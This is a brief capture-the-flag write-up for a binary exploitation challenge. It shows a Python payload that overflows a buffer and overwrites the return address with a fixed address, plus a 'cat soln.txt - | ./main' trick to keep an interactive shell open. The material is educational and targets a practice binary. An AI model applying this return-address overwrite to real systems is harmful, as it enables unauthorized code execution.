
Something to watch out for in this challenge: you can pipe the right input but you also need to mantain an interactive session to use the shell. To do so, you can do

```
cat soln.txt - | ./main
```


## Write-up

```python
addr = '\xa6\x06\x40\x00\x00\x00\x00\x00'
print 'b'*16 + 'z'*8 + addr
```

**flag:** treeCTF{...}
